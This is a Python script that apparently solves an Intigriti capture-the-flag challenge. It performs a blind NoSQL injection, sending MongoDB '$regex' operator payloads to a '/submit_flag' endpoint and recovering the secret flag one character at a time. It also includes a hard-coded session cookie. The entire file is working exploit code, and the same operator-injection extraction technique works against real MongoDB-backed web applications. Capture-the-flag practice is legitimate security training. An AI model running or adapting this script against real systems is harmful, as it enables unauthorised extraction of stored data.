#!/usr/bin/python3

import requests
import string

alphabets = characters = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits + '_@{}-/()!"%=:;'
)

url = "https://ctfc.ctf.intigriti.io/"

s = requests.Session()

headers = {"Cookie": "session=eyJ1c2VyIjp7Il9pZCI6IjQzNTIwNmVmMGIwNDQwZjRhZmZhNDkzMWFkOTYyNjIwIiwidXNlcm5hbWUiOiJqYWR1In19.ZVuvVw.3VRTUYhJ9er-H_V7UErhXjGMAx4"}

# payload = {"_id": "_id:3", "challenge_flag": {"$regex": "^INTIGRITI{"}}


flag = "INTIGRITI{"

while True:
	for char in alphabets:
		payload = {"_id": "_id:3", "challenge_flag": {"$regex": f"^{flag + char}"}}
		resp = s.post(url + "/submit_flag", json=payload, headers=headers)

		if "correct flag!" in resp.text:
			flag += char
			print(f"[*]Flag: {flag}", flush=True)
		if flag.endswith('}'):
			break
	else:
		continue
	break

print(f"[*]Flag: {flag}")